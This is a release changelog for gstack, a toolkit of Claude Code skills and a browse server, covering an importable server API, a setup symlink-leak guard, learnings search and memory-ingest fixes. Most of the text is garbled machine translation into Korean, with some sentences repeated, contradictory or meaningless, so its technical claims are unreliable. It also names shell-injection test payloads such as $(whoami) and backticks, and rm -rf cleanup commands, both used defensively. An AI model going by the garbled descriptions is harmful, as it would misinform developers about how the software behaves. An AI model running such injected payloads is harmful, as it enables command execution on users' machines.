- **`bin/gstack-update-check`** - semver-order guard를 추가했습니다. REMOTE를 태칭한 후, 스크립트는 REMOTE > LOCAL를 `UPGRADE_AVAILABLE`를 방출하기 전에 LOCAL를 REMOTE의 앞에, `UP_TO_DATE`를 쓰고 침묵하게 출구를 씁니다. LOCAL가 REMOTE의 앞에 또는 REMOTE의 앞에 있을 때, `UP_TO_DATE`를 쓰고, 침묵하게 종료합니다.
- **`bin/gstack-update-check`** - `GIT_TERMINAL_PROMPT=0`, `GIT_HTTP_LOW_SPEED_LIMIT=1000`, `GIT_HTTP_LOW_SPEED_TIME=5`를 가진 담 `git ls-remote` 등 끈적한 네트워크는 각 기술 preamble를 걸 수 없습니다.

#### 추가

- **`browse/test/gstack-update-check.test.ts`** — 3개의 새로운 시험 덮음: REMOTE 이전 보다는 LOCAL 침묵하고 시렁 `UP_TO_DATE`, 다 세그먼트 `1.9.0.0 < 1.10.0.0`는 `UPGRADE_AVAILABLE`, 다 세그먼트 `1.10.0.0 > 1.9.0.0` 침묵합니다.

## [1.34.0.0] - 2026-05-12

## **GStack는 이제 서브 모듈로 소모품입니다.** ## **5개의 새로운 수출한 돕ers + `AUTH_TOKEN` env 주입 + `import.meta.main` 문은 포크 없이 찾아낸 서버를 포함했습니다 downstream Bun 프로젝트.**

GStack의 `browse/src/server.ts`는 CLI 항목 포인트로 생활을 시작: 그것을 수입하고 모듈 부하에 `Bun.serve`를 묶을 것입니다, 무작위 포트를 주장하고, 프로젝트 상태를 `.gstack/` 디디디에 쓰기. 라이브러리가 포크 또는 공급 업체에 있어야 할 때 gstack를 소비하고 싶은 모든 embedder. 이 릴리스는 그. 검색 서버는 이제 수출 API 표면 (`ServerConfig`, `ServerHandle`, `resolveConfigFromEnv`, `start`), 명예 `process.env.AUTH_TOKEN` embedder-driven token 할당 및 문에 대한 모든 모듈 부하 부작용 `import.meta.main` 그래서 일반 `import` 프로그램에서 제로 부작용 실행 Bun 프로그램에서. fetch 핸들러 공장 계약은 새로운 유형에 문서화됩니다; 런타임 공장 기능 (`buildFetchHandler`)은 deliberate follow-up입니다. 피닉스는 시작 () + ENV 표면에 대하여 오늘 발송할 수 있습니다.

같은 릴리스는 adversarial 검토 및 실제 TDZ 회귀 버그 수정에서 해결을 강화하는 세 가지 보안을 제공합니다. `claude`가 `PATH`에서 누락되어있을 때만 표면이 수정됩니다.

### 중요 한 숫자

출처: `bun test browse/test/` 이 branch — 5개의 새로운 시험 파일 + 1를 위한 확장.

| Surface | 의 전 | 후지후 |
|---|---|---|
| 제3자 공정에서 `browse/src/server.ts` 가져 오기 | daemon, `Bun.serve`, 쓰기 국가를 묶는 자동 시작 | No 부작용 (`import.meta.main`에 gated) |
| `AUTH_TOKEN` 소스 | 항상 `crypto.randomUUID()` 모듈 부하에서 | `process.env.AUTH_TOKEN` (양화, >= 16 숯은 unicode-whitespace 지구 후에) → randomUUID fallback |
| 수출 API embedders | None (`start`는 내부, no 유형이었습니다) | `ServerConfig`, `ServerHandle`, `resolveConfigFromEnv`, `start`, `sanitizeAuthToken` |
| `isCustomChromium()` 탐지 | 존재하지 않는 | 수출된 돕기: `GSTACK_CHROMIUM_KIND=custom-extension-baked` 선호하는, 경로 substring fallback |
| Chromium 프로파일 경로 | 하드 코딩 `$HOME/.gstack/chromium-profile` | `resolveChromiumProfile(explicit?)`는 arg → `CHROMIUM_PROFILE` env → `$GSTACK_HOME/chromium-profile`를 명예를 줍니다 |
| 이야기 `SingletonLock` / `Socket` / `Cookie` 정리 | 원시 `fs.unlinkSync`와 두 개의 콜린 | 절대경로 요구 사항 + 기본 이름 또는 ENV 일치 가드와 함께 하나의 돕기 (`cleanSingletonLocks`) |
| TDZ 누락 `claude` CLI | `checkTranscript` 초기반의 경로 `ReferenceError` | `finish()` 위 호평 `resolveClaudeCommand()` + 시도/catch 포장 |
| `AUTH_TOKEN=$'﻿'` (BOM-만) `.trim()` | Yes (원수용기 분비) | No (단코드 화이트스페이스 스트립에 의해 거절 + 최소 16-char) |
| 새로운 표면을 덮는 시험 | 0 | 5개의 파일 (확장된 `config.test.ts`, 8 `isCustomChromium`, 1 TDZ 회귀, 12 공장 API + 부작용 감시에서 34의 새로운 시험) |

adversarial 검토 패스는 BOM-token 우회 전에 merge — `.trim()` 지구 ASCII whitespace 그러나 U+FEFF/U+200B/U+00A0. 새로운 `sanitizeAuthToken()`는 unicode-aware regex를 사용하고 벗기는 후에 16개 숯 보다는 더 짧은 것을 거부합니다, 그래서 misconfigured embedder는 no 더 긴 배 1개의 character를 발송합니다.

### gstack를 구현하는 빌더의 의미는 무엇입니까?

Phoenix and any future Bun-based consumer can now `import { start, resolveConfigFromEnv } from 'browse-server-upstream/browse/src/server'`, set `AUTH_TOKEN` + `BROWSE_PORT` env, and run gstack as a child without forking. The exported `ServerConfig` documents the full factory contract for the eventual `buildFetchHandler` runtime — when that lands in the follow-up PR, today's API surface becomes a no-op compat shim. Run `/gstack-upgrade` to pick it up. The browse CLI behavior (`bun run dev <command>`) is unchanged.

### 항목화 된 변경

### 추가
- `browse/src/config.ts`: `resolveGstackHome()` (전원 `GSTACK_HOME`, `os.homedir()/.gstack`), `resolveChromiumProfile(explicit?)`, `cleanSingletonLocks(dir)`, 적분파 + basename/env 가드를 가진 /env.
- `browse/src/browser-manager.ts`: `GSTACK_CHROMIUM_KIND=custom-extension-baked` 선호된 신호, `GSTACK_CHROMIUM_PATH`에 substring fallback를 가진 `isCustomChromium()`를 수출했습니다.
- `browse/src/server.ts`: `ServerConfig`와 `ServerHandle` 유형, `resolveConfigFromEnv()`, `sanitizeAuthToken()`, 수출된 `start()`. `AUTH_TOKEN`는 unicode-aware sanitization를 가진 env를 명예를 줍니다.
- `browse/test/config.test.ts`: 16개의 새로운 시험 (전진, 방어적인 감시, ENOENT idempotency).
- `browse/test/browser-manager-custom-chromium.test.ts`: 8개의 시험은 env-kind의 경로 substring, 주식 크롬, playwright 번들어진 케이스를 덮습니다.
- `browse/test/security-classifier-tdz.test.ts`: 누락된 CLI를 위한 회귀 시험은 경로 (IRON RULE)를 degraded.
- `browse/test/server-factory.test.ts`: 14의 시험은 AUTH_TOKEN env semantics + 유형 표면은 검사 + 보존한 수출을 검사합니다.
- `browse/test/server-no-import-side-effects.test.ts`: `import`를 proving하는 subprocess sentinel는 자동 시작하지 않습니다.

### 변경
- `browse/src/security-classifier.ts`: `finish()` `checkTranscript`의 `resolveClaudeCommand()` 위 호이스트가 `checkTranscript`의 전제 실행자. `resolveClaudeCommand()`와 `spawn()`는 Promise 대신 구조화한 신호에 degrade 시도/catch에서 감싸인 /catch를 호출합니다.
- `browse/src/browser-manager.ts` `launchHeaded`: `--load-extension`는 `!isCustomChromium()` (확장 `ServiceWorkerState::SetWorkerId` DCHECK에 연장 가닥 관례 Chromium)를 가진 문질렸습니다. 단면도 경로는 `resolveChromiumProfile()`에 전환합니다. Pre-launch `cleanSingletonLocks(userDataDir)` 추가되는.
- `browse/src/server.ts`: 신호 핸들러 (SIGINT, SIGTERM, Windows `exit`, `uncaughtException`, `unhandledRejection`) 및 모듈 바닥에 자동 킥오프 `start().catch(...)`는 `import.meta.main`에 문지릅니다. `shutdown()` 및 `emergencyCleanup()` 교환 인라인 `SingletonLock`/`Socket`/`Cookie` 반복 `cleanSingletonLocks(resolveChromiumProfile())`.

### 고정
- TDZ `ReferenceError` `checkTranscript` `claude` CLI가 `PATH` (latent -만 방아쇠가 붙은 기숙사 코드 경로)에서 누락될 때 TDZ `ReferenceError`.
- AUTH_TOKEN unicode-whitespace 우회: `.trim()` 단지 벗겨진 ASCII whitespace, 그래서 `process.env.AUTH_TOKEN=$'﻿'` (BOM) 또는 `$'​'` (zero 폭 공간)는 1 차 수동적인 수염기가 되었습니다. 새로운 `sanitizeAuthToken()` 지구 모든 unicode whitespace 및 16의 숯 보다는 더 짧은 것을 거부합니다.
- `cleanSingletonLocks` 경로-대역 경화: 이제 절대 경로와 일치해야 합니다 절대 해결 `CHROMIUM_PROFILE` env, 차단 CWD-relative footguns.

### 기여자
- 전체 `buildFetchHandler` 런타임 추출 (공장 폐쇄에 13 모듈 레벨 점적의 호이스트, 플러스 `beforeRoute` auth-then-hook 배선, 플러스 `stopListeners` 구현)은 **후속 PR에 의거하여**입니다. 수출 유형 문서는 eventual 계약; 오늘 릴리스는 최소 비동기 표면 그래서 피닉스는 `import { start }` + AUTH_TOKEN env에 대한 v0.6.0.0을 착륙 할 수 있습니다.
- 전체 플랜에 대해 `/Users/garrytan/.claude/plans/system-instruction-you-are-working-swirling-fountain.md` + 13 결정 + 코덱 외부 서스 긴장 해결.

## [1.33.2.0] - 2026-05-11

## **`./setup` no 더 긴 도체 worktree에서 실행할 때 글로벌 설치를 오염시킵니다.** ## **6 라인 배쉬 가드는 BSD `ln -snf` 발군을 잡는다. `~/.claude/skills/gstack/`로 per-worktree symlinks를 유출했다.**

gstack repo 자체 (예: `~/conductor/workspaces/gstack/dublin-v1`)의 지휘자 worktree에서 `./setup`를 ran 때, 그것은 침묵적으로 당신의 세계적인 설치를 손상할 것입니다. "이 체크 아웃을 활성화 gstack" branch 으로 등록하십시오 `ln -snf "$SOURCE_GSTACK_DIR" "$HOME/.claude/skills/gstack"`. macOS 및 BSD에, 목적지가 기존 실제 디렉토리 (당신의 세계적인 git clone)일 때, `ln -snf`는 아이를 대체합니다. 그것은 아이를 대체합니다. `~/.claude/skills/gstack/dublin-v1 → ~/conductor/workspaces/gstack/dublin-v1`. Claude Code는 `~/.claude/skills/`를 포함하는 `SKILL.md`에 있는 각 지시물을 읽습니다, 그래서 각 누출된 worktree는 그것의 자신의 최고 수준 기술로 보여주었습니다: `/dublin-v1`, `/wellington`, `/santiago-v1`, 등등. 소음으로 채워지는 기술 피커.

`setup`의 수정은 `~/.claude/skills/gstack`가 이미 `pwd -P`가 `$SOURCE_GSTACK_DIR`와 다르는 `$SOURCE_GSTACK_DIR`가 이미 실제(non-symlink) 디렉토리인지 확인합니다. 이렇게 하면 `ln -snf`를 거부하고, 4-line remediation hint를 인쇄하고, Claude 등록 branch를 정리합니다. (`browse`, `design`, `make-pdf`, `find-browse`, `find-browse`, `find-browse`는, `--local`를 통해 다른 코드가 없는 코드로 나타낸다.

### 중요 한 숫자

출처: `bun test test/setup-conductor-worktree.test.ts` — 새로운 감시의 각 branch를 덮는 8개의 시험은 BSD `ln -snf` 버그 자체의 행동 재생산 플러스.

| 팟캐스트 | 의 전 | 후지후 |
|---|---|---|
| `./setup` worktree A에서 글로벌 설치가 가능 | Leaks `~/.claude/skills/gstack/A → workspaces/gstack/A` | 의약 힌트와 함께 훔쳐 |
| `./setup` N sibling worktrees에서 일주일에 | N child symlinks는 글로벌 설치에 축적 | 0개의 누출 |
| Claude Code 기술 피커는 여분 입장을 보여줍니다 | Yes: `dublin-v1`, `wellington`, `santiago-v1`, 등. | No |
| Fresh install (no 기존 글로벌) | Worked | 일 (변경된 경로) |
| Re-running `./setup` 의 글로벌 설치 | Worked | 일 (변경된 경로) |
| 감시의 시험 적용 | 0 테스트 | 8개의 시험, 모든 branch |

`test/setup-conductor-worktree.test.ts`의 행동 테스트는 실제로 `ln -snf SRC DST`를 실제 tmpdir에 대해 호출하여 macOS/BSD의 아이-symlink 동작을 증명합니다. 그런 다음 새 가드가 누출을 증명하는 것을 다시 실행합니다. 버그는 이제 테스트 스위트에서 문서화되어 패치가 아닙니다.

### 이 빌더를 위한 뜻

Claude Code에서 여분 최고 수준의 기술을 보았을 경우, `/dublin-v1`, `/wellington`, 등), 누출이 있습니다. `/gstack-upgrade`를 실행하여이 수정을 선택하면 수동으로 기존의 아이 symlinks를 제거하십시오. `cd ~/.claude/skills/gstack && find . -maxdepth 1 -type l -delete`. 가드는 `./setup`의 모든 지휘자 worktree에서 gstack repo를 방지합니다. 실제로 worktree를 활성 gstack (레이, 일반적으로 큰 진입 변화가 변화하는 경우) 등록하고 싶다면 글로벌 설치를 먼저 제거하십시오. `rm -rf ~/.claude/skills/gstack && cd <your-worktree> && ./setup`.

### 항목화 된 변경

#### 고정

- **`setup`** - `ln -snf "$SOURCE_GSTACK_DIR" "$CLAUDE_GSTACK_LINK"` 이전에 지휘자 worktree 감시를 추가했습니다. `[ -d "$CLAUDE_GSTACK_LINK" ] && [ ! -L "$CLAUDE_GSTACK_LINK" ]`를 실제 디렉토리에 체크하고, `cd ... && pwd -P`는 근원에 대하여 비교하기 위하여. 그들이 다른 경우에, 놓으십시오 `_SKIP_CLAUDE_REGISTER=1`는, 경로를 모두 naming, 그리고 지구 설치를 접촉하지 않고 Claude 등록 branch를 출구합니다.

#### 추가

- **`test/setup-conductor-worktree.test.ts`** — 8 tests (27 expect calls) covering: guard placement in `setup` before `ln -snf`, `pwd -P` resolution against `$SOURCE_GSTACK_DIR`, the skip-branch's remediation message, BSD `ln -snf` reproducer (proves the bug shape exists), guard skips when dest is real-dir-elsewhere, guard allows ln when dest doesn't exist, guard allows ln when dest is an existing symlink (upgrade-in-place), guard allows ln when dest already resolves to source (self-rerun).

#### 기여자

- 가드 의도적으로 NOT는 `~/.claude/skills/gstack/` 안쪽에 pre-existing 오염을 청소합니다. 사용자는 수동 구출이 눈에 띄는 경우에 (구조물을 위한 무슨이 방법 보십시오) 누출된 symlinks를 제거해야 합니다. 개조한 정리는 수동 구제 마찰이 눈에 띄는 경우에 미래 방출을 위해, 분리된 이동 스크립트를 요구할 것입니다.

## [1.33.1.0] - 2026-05-11

## **긴 기술 중지는 시작 상황에 멀리 드리기.** ## **`/investigate`, `/qa`, `/ship`는 이제 pull 학습은 실제로 무엇을 키워하고, pull가 새로운 서브 스쿼크로 작업이 진행되는 중간 흐름을 새로 고침합니다.**

마지막 30+ 버전을 위해, 각 gstack 기술은 동일한 방법을 배우게 했습니다: `gstack-learnings-search --limit 10` 정상에, 일반적인 top-10에 신뢰, no 조회, no 새로 고침. 짧은 기술은 벌금, 그들은 적재한 학습이 stale에 가기 전에 끝냈습니다. 긴 기술 (`/investigate`는 4 단계, `/qa`는 다 벌레 고침 반복을, `/ship` 범프는 시험에서 PR에 ~20 단계를 배열했습니다 PR는 0/PR에서 내리는 어떤 짐에서든지에 적재했습니다. 시간 `/ship`는 단계 12 (VERSION 범프)에 도달하여 단계 1에 끌어 당기는 학습은 프로젝트의 가장 높은 습득 입장이 아니고, 헤드 라인 기능에 대해 배송하지 않았습니다.

이 릴리스의 두 가지 변화 배 : 세 가지 긴 기술의 상단에 per-skill 작업 모양의 쿼리, 그리고 중간 흐름은 시작에 대해 이야기하는 하위 작업에 키워 학습을 다시 풀 내부 체크 포인트를 새로 고침합니다. 둘 다 `bin/gstack-learnings-search` 자체에 수정에 의존합니다. 이진의 `--query` 플래그는 이전에 key/insight/files,에 대한 전체 문자열 일치를 사용했습니다. `"debug investigation"` 같은 쿼리는 정확히 이해하는 학습에 대해 설명 할 것입니다. flag는 이제 토큰-OR: whitespace에 나눌 수 있으며, ANY token가 어떤 해적 필드에 나타날 수 있습니다. 이것은 대부분의 사용자들이 검색 플래그에서 기대하는 것입니다.

### 중요 한 숫자

출처: 이 프로젝트의 로컬 `learnings.jsonl` (35 이 릴리스의 항목). 같은 쿼리, 같은 플래그, 이전 vs 이후 바이너리 수정:

| Query를 | 이전 (substring) | 이후 (token-OR) | Δ |
|-------|-------------------|------------------|---|
| `"debug investigation root cause"` | 0 항목 일치 | 5개의 항목 일치 | +5 |
| `"qa testing bug regression"` | 0 항목 일치 | 2개의 항목 일치 | +2 |
| `"release ship version changelog"` | 0 항목 일치 | 8개의 항목 일치 | +8 |
| `"skill resolver"` | 0 항목 일치 | 12 항목 일치 | +12 |

정적 기술 모양의 쿼리에 회신은 0에서 관련으로 갔다. 이 수정없이, 변경의 나머지는 침묵했다. 배시가 실행 될 것입니다, 이진은 0을 no 출력으로 종료하고 기술은 항상 렌더링 동일한 빈 섹션을 렌더링 할 것입니다.

### 이 빌더를 위한 뜻

버그에서 `/investigate`를 실행하면 top-of-skill 학습 pull는 이제 관련 Top-10 자신감을 항목 대신 조사 패턴을 표면화합니다. 1 단계 완료되면 (근법률을 말함), 중간 흐름은 화재와 재-pulls 학습은 당신의 hypothesis 키워드에 키워진 것을 학습하므로, 해당 관련이 있을 때 에이전트의 상황에 맞는 동일한 문제 모양 토지에 대한 수정이 필요합니다. `/qa` (구정 루프 전에 다시, 버그 구성 요소에 키) 및 `/ship` (VERSION/CHANGELOG 단계 전에 재빠른, 헤드 라인 기능에 키). 다른 13 짧은 라이브 기술 변경되지 않습니다: 그들의 기존의 top-10 일반 pull는 여전히 그들의 관심에 대 한 권리.

### 항목화 된 변경

#### 변경

- **`bin/gstack-learnings-search`**는 이제 토큰-OR `--query` semantics를 사용합니다. 멀티 탭 쿼리는 백스페이스에 분할하고 ANY token가 ANY의 key/insight/files.의 하위 문자열로 나타납니다. No 플래그 변경; 같은 CLI 표면. 오래된 전체 문자열 하위 문자열 동작은 실제적으로 새로운 학습을 갖지 않는 침묵의 발군이었습니다. No 플래그 변경; CLI 표면. CLI는 실제적으로 새로운 학습을 갖는 데 도움이되지 않았습니다. `test/gstack-learnings-search.test.ts`
- **`scripts/resolvers/learnings.ts`** `{{LEARNINGS_SEARCH}}` 매크로는 `query=KEYWORD` 인수를 받아 들였습니다. 빈 값은 no-query (principle of least surprise: a stray `{{LEARNINGS_SEARCH:query=}}` placeholder get today's behavior, not build failure)을 통해 떨어지게 됩니다. 패턴은 `composition.ts`의 매개 변수화 된 - macro 인프라를 재사용합니다. 생성 된 SKILL.md 출력에서 쿼리가 바이트 ID를 전달하지 않는 13 템플릿입니다. Shell-jection: guardion: guardion: guardion: 쿼리 값은 gen-skill-docs 시간에서 `^[A-Za-z0-9 _-]+$`에 백리스트를 붙여 넣기 때문에 `$()`, backticks, semicolons 또는 미래의 템플릿에 인용하면 실행 가능한 bash 대신 큰 빌드 오류를 던집니다.
- **`investigate/SKILL.md.tmpl`** top-of-skill 학습 pull 키가 `debug investigation root cause hypothesis bug fix`. 새로운 중간 흐름은 단계 1 (hypothesis)와 단계 2 (analysis) 사이 구획을 상속하고 저하에서 1개의 알파벳 전용 키워드를 선택하기 위하여 고약합니다. 포함되는 일한 예 (좋은: `auth-cookie`, `session-expiry`; 나쁜: `auth.ts:47`, `<hypothesis-keyword>`).
- **`qa/SKILL.md.tmpl`** top-of-skill pull는 `qa testing bug regression flake fixture`로 키워졌습니다. 중간 흐름은 단계 7 (triage)와 단계 8 (fix 반복) 사이에서 삽입하고, 벌레 성분 이름에 열쇠를 주었습니다.
- **`ship/SKILL.md.tmpl`** top-of-skill pull는 `release ship version changelog merge pr`로 키워졌습니다. 중간 흐름은 단계 12 (VERSION 범프)의 앞에 다만, 이 branch에 헤드라인 특징에 열쇠를 삽입했습니다.
- **`test/gen-skill-docs.test.ts`** 5 new resolver assertions: no-args has no `--query`, claude+query=foo bar appears in BOTH cross-project and project-scoped branches, codex host gets `--query` in the codex bash variant, empty value `query=` falls through to no-query, AND shell-injection payloads (`$(whoami)`, backticks, `;`, `&`, `"`, `\`, `$x`) throw a build error.
- **모든 생성 된 `SKILL.md` 파일 3 긴 기술 + 4 호스트 출력** 재생. 다른 13의 기술 생성한 산출은 diff를 통해 확인된 바이트 IDentical (backwards-compat)입니다.

#### 기여자

- @Fergtic ([만성 글쓰기](https://github.com/Fergtic/chronicle-write-up))에 의해 기여한 로드온스 + no-refresh 패턴과 이 작업을 동기 부여하는 지출-per-success 데이터 포인트. 정적-skill 쿼리 확장은 또한 Codex 외부-voice 검토에서 키 사실 체크에 의해 알려졌다: 이진의 `--query`는 단일 서브스트링 일치, 아니 토큰-OR, 어떤 야생 쿼리에 침묵.

## [1.33.0.0] - 2026-05-11

## **`/sync-gbrain` 기억 단계 no 더 긴 무한 루프 또는 침묵으로 진행을 던졌습니다.** ## **gitleaks 스캐닝은 선택적으로, 신호 처리는 실제로 gbrain 아이를 죽이고, 국가 쓰기는 원자입니다.**

`/sync-gbrain` memory ingest used to spawn `gitleaks detect` plus `gbrain put` once per file across 1,841+ transcripts and artifacts, then the orchestrator SIGTERM'd the whole pipeline at 35 minutes with no state flush. Every cold run started from zero and burned 35 minutes for nothing. v1.33 rewrites the memory stage around `gbrain import <dir>` (batch path that's been in gbrain since v0.20). 준비 단계는 소스, 곱셈의 곱셈 구조, 그 후에 `gbrain import`를 한 번 호출합니다. 파일 실패는 byte-offset snapshot를 통해 `~/.gbrain/sync-failures.jsonl`에서 다시 읽습니다. 그래서 state file only record files that really landed in PGLite. `--scan-secrets`는 이제 `gstack-brain-sync`가 이미 실제 크로스 머신 경계 (git push)에서 레퍼런스 기반 비밀 스캐너를 실행하기 때문에 선택된 플래그입니다. 각 콜드 실행에 ~470 초를 차지하는 파일이 적힌 방어 심층을 스캔합니다.

신호 핸들러는 이제 `SIGTERM`와 `SIGINT`를 gbrain Child로 전파하고 `process.exit` 이전에 staging 디렉토리를 정리하고, PGLite 쓰기 잠금을 유지하고 CPU를 시간 동안 굽는 orphan-process 버그를 수정합니다. 주 파일은 원자로가 되었기 때문에 충돌 중간 쓰기는 주에서 ncate 할 수 없습니다. 전체 파일 `sha256` 변경 감지 (과는 1MB에서 캡핑) 꼬리 편집을 긴 부분 성적에 침묵적으로 놓은 오래된 알고리즘을 잡습니다.

### 중요 한 숫자

출처: `~/.gstack/projects/` corpus (5,135 성적 + 자궁), `bin/gstack-memory-ingest.ts --bulk` gbrain v0.31.2에서 신선한 PGLite에.

| Metric | 전 (v1.31.x) | 후 (v1.33) | Δ |
|---|---|---|---|
| 콜드 런 완료 | no, 35분 루프 + null 출구 | yes | works |
| 단계 준비 (5,135 파일) | ~10-12 분 | <10초 | ~60x의 |
| gitleaks의 스캔 | 1,841 의무 | 0 default, `--scan-secrets`를 통해 선택 | gated |
| SIGTERM에 플러시된 주 파일 | no, 손실에 kill | yes, 출구의 앞에 sync 정리 | fixed |
| Orphan gbrain 어린이 후 timeout | yes, 관찰된 15hr CPU 하수구 | no, 신호 전달 | fixed |
| FILE_TOO_LARGE 블록 전개 | yes | no, D7를 통해 제외된 경로가 실패했습니다. | fixed |
| `test/gstack-memory-ingest.test.ts`의 테스트 | 17 | 21 | +4 |

| 의약 | 어떤 착륙 |
|---|---|
| D1 계층화 | `writeStaged`는 진단 세그먼트 당 `mkdir -p`를 합니다 |
| D2 절단 | `gbrainPutPage` 삭제, no `--legacy-ingest` 플래그 |
| D3 소스-첫 번째 비밀 검사 | `--scan-secrets`, default를 통해 검사 opt-in |
| D4 OK/ERR verdict | Per-file 실패는 요약에 표시하지만 시스템 오류는 ERR |
| D5 통일 상태 스키마 | No 별도의 스킵 목록 파일 |
| D6 신뢰도 | gbrain의 content_hash dedup는 재회를 저렴하게 만듭니다. |
| D7 동기화 파빌처 바이트 오프셋 | `readNewFailures`는 사전 승인 snapshot 이후만 바이트를 읽습니다. |
| F6 원자 상태는 씁니다 | `tmp+rename` 대신 직접 덮음 |
| F9 전체 파일 sha256 | 침묵하게 삼키는 꼬리 편집을 1MB 캡 제거 |

Prepare phase dropped from ~10 minutes to <10 seconds because the dominant cost was `gitleaks detect` cold start (~256ms per file, 5,135 files = 22 minutes of subprocess startup). The cross-machine secret boundary is `git push`, and `gstack-brain-sync` already runs its own regex scanner there. Local PGLite ingest of files that already live on disk in plaintext doesn't change exposure. The opt-in flag survives for users who want per-file ingest scanning, but it's no longer the default tax on every cold run.

### 이 빌더를 위한 뜻

If you've been hitting the 35-minute hang on `/sync-gbrain`, it's gone. The architecture is correct on this side now. A separate `gbrain import` performance issue surfaced during testing where the gbrain CLI itself takes >10 minutes on 5,131-file staging dirs (10 seconds on 501 files), which is filed as a P2 TODO for gbrain proper. That's the next bottleneck to chase, but it lives in gbrain's import path, not in the gstack orchestrator. Run `/sync-gbrain` after upgrading. 루프를 본다면,이 수정합니다.

### 항목화 된 변경

#### 추가
- `bin/gstack-memory-ingest.ts:1093` — `preparePages` 순수한 기능: 국가를 통해 도보 근원, mtime-skip, 선택적인 gitleaks 검사 (`--scan-secrets`), 앵그 transcripts 및 artifacts는, `title`/`type`/`tags` 주사된 frontmatter를 만듭니다.
- `bin/gstack-memory-ingest.ts:920` — `writeStaged`는 슬러그 구조에 대한 계층 구조의 계층 구조로 준비된 마크 다운을 작성합니다. `mkdir -p` 슬러그 세그먼트 당. `/` (`transcripts/claude-code/foo`와 같이)는 일치한 하위디렉토리 트리를 얻고 gbrain의 경로 결정 `slugifyPath` 라운드 트랙을 정확히 보여줍니다.
- `bin/gstack-memory-ingest.ts:961` — `parseImportJson`는 gbrain의 `--json` 마지막 선 탑재량을 읽습니다. 선이 헛되지 않을 때 0패드가 침묵하게 덧붙여 말하면 `null` (`system_error`로 떨어졌습니다.
- `bin/gstack-memory-ingest.ts:993` — `readNewFailures` 스냅샷 `~/.gbrain/sync-failures.jsonl` 가져오기 전에 바이트 오프셋, 읽는 단지 바이트를 읽습니다, 지도 gbrain의 staging-relative 경로는 `stagedPathToSource` 지도를 통해 소스 경로로 다시.
- `bin/gstack-memory-ingest.ts:1009` — `runGbrainImport` async wrapper 약 `child_process.spawn` 그래서 신호 운송업자는 부모 `SIGTERM`/`SIGINT`에 죽이는 아이 참고가 있습니다. Pre-2026-05-11 `spawnSync`는 신호 전달 불가능하고 gbrain를 만들 때마다 관현관이 시간으로 나아졌습니다.
- `bin/gstack-memory-ingest.ts:1218` — `installSignalForwarder`는 살아있는 아이에 전달하는 `SIGTERM`/`SIGINT` 핸들러를, 동시에 활성화된 staging 디렉토리를 청소하고, 그 후에 출구를 암호로 고쳐 씁니다. 신호 핸들러 안쪽에서 `process.exit`가 `finally` 구획 후에 달리지 않는, 그래서 정리는 핸들러 자체에서 일어날 것을 가지고 있습니다.
- `bin/gstack-memory-ingest.ts:194` — `--scan-secrets` CLI 플래그와 `GSTACK_MEMORY_INGEST_SCAN_SECRETS=1` env var를 준비 단계 동안 per-file gitleaks 스캐닝으로 다시 선택한다. 기본값으로 떨어져.
- `test/gstack-memory-ingest.test.ts:457` — 5개의 새로운 시험 덮음 hierarchical staging slug 둥근 지구, frontmatter 주입, D7 sync-failures exclusion, 누락된`import`-subcommand 오류 경로, 그리고 `--scan-secrets` 더러운 자원은 가짜 gitleaks shim로 건너 뛰기.
- `docs/designs/SYNC_GBRAIN_BATCH_INGEST.md` - D1-D8 결정, 소스 인증 gbrain 동작, 성능 측정, F9 해시 마이그레이션 노트와 함께 전체 디자인 문서.

#### 변경
- `bin/gstack-memory-ingest.ts:288` — `saveState`는 이제 `tmp+rename`를 사용하므로, 추락 중첩은 국가 파일을 truncate 할 수 없습니다. `gstack-gbrain-sync.ts:508`의 관현악의 기존 패턴과 일치합니다.
- `bin/gstack-memory-ingest.ts:307` - `fileSha256`는 전체 파일 (F9)을 해시합니다. Pre-2026-05-11는 1MB에서 멈추지 않아, 그래서 긴 부분 성적에 대한 편집은 변하지 않고 결코 다시 전달되지 않았습니다. 한 번 업그레이드에 절실 : 이전되지 않은 파일이 1MB-capped 해시를 유지하지 않는 파일, 그 순간이 제대로 처리되는 파일을 유지합니다. No 데이터 손실.
- `bin/gstack-memory-ingest.ts:798` — `gbrainAvailable` 프로브 `import` `--help` 출력에서 subcommand (와: `put` subcommand). `import` 없이, 기억 단계는 침묵하게 degrading 대신 `system_error`를 가진 비 zero를 출구합니다.
- `bin/gstack-gbrain-sync.ts:442` - 기억 단계 파서 우선적으로 `[memory-ingest] ERR` 선을 요약을 위한 최신 `[memory-ingest]` 선, 접두사를 벗고, `status=null`를 가진 아이 출구 때 표면 `(killed by signal / timeout)`를 끕니다.

#### 고정
- 파일 gitleaks 검사는 과다한 방어 심화로 메모리에서 모든 성적 및 artifact에 실행되었습니다. 크로스 머신 비밀 경계는 `gstack-brain-sync` (git push)이며, 이미 Python regex 스캐너를 실행합니다. Local PGLite ingest는 일반 텍스트의 디스크에 이미 생명을 주는 내용에 대한 노출 표면을 변경하지 않습니다.
- 신호 핸들러는 이제 gbrain 아이를 죽이고 출구 전에 staging 디렉토리를 청소합니다. Pre-fix, 각 오케스트라 타이머 타임 아웃은 PGLite 쓰기 잠금을 유지하고 CPU 사용자 통지 및 `kill -9` 수동으로 (구부: 15--CPU-time orphan 효스테의 실행에서 여전히 살아남은).
- `parseImportJson` no 더 긴 침묵하게 `{imported: 0, errors: 0}` 때 gbrain's `--json` 산출은 파를 하지 않습니다. `null`, `system_error`로 콜러 표면을 돌려주십시오 그래서 오해 OK/0/0. 대신 ERR를 막습니다.
- `bin/gstack-memory-ingest.ts` `require("fs")`는 가동 가능한을 위한 top-level ESM `import`s로 대체했습니다.

#### 기여자
- `/Users/garrytan/.claude/plans/purrfect-tumbling-quiche.md`의 플랜 파일은 전체 리뷰 체인을 캡처합니다. `/investigate` → `/plan-eng-review` (5개의 건축 결정 D1-D5) → `/codex review` 외부 청구서 계획 도전 (9개의 발견, 3개의 재구성을 D6-D8)로 재구성합니다. 플랜은 또한 D3를 선택하여 D3를 펄스하는 포스트 코덱 사용자 퍼프 리뷰를 기록합니다.
- `TODOS.md` 파일 P2: 큰 시효 디너에 `gbrain import` 퍼프를 조사 (5,131 파일이 소요될 경우 >10 분 501 10 초를 소요할 때 - gbrain-side N+1 SQL 또는 자동 링크 재구성 의심). P3: 캐시 "no 마지막 수입 이후 변경"실제로 진정한 노-op 빠른 경로에 대한 준비 배치 수준.
- `Plan completion audit`는 branch: 17/21 DONE, 1 CHANGED (D3는 opt-in를 만들었습니다), 2개의 deferred (F8 벤치 마크 마구를 분리한 일로, 24path 단위 적용은 통합 혼자 갔다.

## [1.32.0.0] - 2026-05-10

